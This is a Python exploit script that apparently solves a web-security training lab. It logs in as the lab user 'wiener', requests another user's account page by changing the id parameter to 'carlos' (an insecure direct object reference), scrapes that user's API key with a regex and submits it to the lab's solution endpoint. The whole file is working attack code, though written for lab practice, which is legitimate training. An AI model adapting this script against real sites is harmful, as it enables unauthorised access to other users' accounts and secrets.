import requests
import sys
from bs4 import BeautifulSoup
import re

#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def get_csrf_token(url, session):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf
    

def login(url, session):
    print("(+) Logging in as user Wiener...")
    login_page = url + "/login"
    csrf_token = get_csrf_token(login_page, session)
    login_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}
    response = session.post(login_page, data=login_data)
    if response.status_code == 200:
        print("(+) Logged in successfully.")
        return session
    else:
        print("(+) Could not login!")
        print("(+) Exiting...")
        exit(1)


def get_key(url, session):
    print("(+) Getting Carlos's API Key...")
    carlos_account = url + "/my-account?id=carlos"
    response=session.get(carlos_account)
    res = response.text
    key = (re.search ("Your API Key is:(.*)", res).group(1)).strip()
    api = key.split('</div>')[0]
    print('(+) The API Key is: ' + api)
    return api

def submit_key(url, session, api):
    print("(+) Submitting the Key...")
    solution = {"answer": api}
    solution_url = url + "/submitSolution"
    response = requests.post(solution_url, data=solution)
    print("(+) Successfully completed the lab.")
    


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        sys.exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    session = requests.session()
    login(url, session)
    api = get_key(url, session)
    submit_key(url, session, api)

if __name__ == "__main__":
    main()